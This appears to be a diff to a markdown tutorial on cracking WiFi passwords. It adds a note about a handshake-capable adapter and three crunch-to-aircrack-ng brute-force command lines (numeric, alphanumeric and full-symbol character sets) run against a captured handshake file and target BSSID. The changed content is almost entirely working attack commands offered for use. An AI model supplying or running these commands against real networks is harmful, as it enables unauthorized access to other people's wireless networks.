@@ -19,6 +19,7 @@ sudo apt install crunch
 # verify crunch installation
 crunch -h
 ```  
+And a goof wifi adapter who can do handshakes  
 ## A. Start general info  
 `Default Folder`
 ```bash
@@ -124,8 +125,17 @@ wait for sometimes it will execute the process
 
 ## F. Brute Force Attack (Method Two)  
 this take too much time to penetrate  
+F.1: Number only  
 ```bash
-crunch 8 12 pbcedfeg | aircrack-ng file_name.cap -b <bssid> -w-
+crunch 4 4 0123456789 | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
+```  
+F.2: Character Set  
+```bash
+crunch 8 8 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
+```  
+F.3: Complex Character Set  
+```bash
+crunch 12 12 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+=-[]{}|;:'",.<>?/ | aircrack-ng file_name.cap -b <bssid> -w- 2>&1 | tee brute.txt
 ```  
 
 ## Post process  
